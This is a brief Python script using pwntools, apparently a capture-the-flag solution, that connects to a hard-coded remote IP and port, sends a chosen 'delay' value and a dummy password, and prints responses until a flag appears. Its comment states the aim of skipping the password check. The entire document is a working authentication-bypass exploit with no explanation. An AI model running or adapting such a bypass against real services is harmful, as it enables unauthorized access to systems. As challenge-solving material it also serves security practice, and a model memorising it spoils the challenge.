from pwn import remote

host = '46.246.109.251'
port = 63240

# Skip password check and get flag
delay = 30401
password = "a"
conn = remote(host, port)
conn.send((str(delay) + '\r\n').encode())
conn.send((password + '\r\n').encode())
while True:
    res = conn.recvline()
    print(res)
    if b'Shutting down...' in res or b'flag' in res:
        break
conn.close()
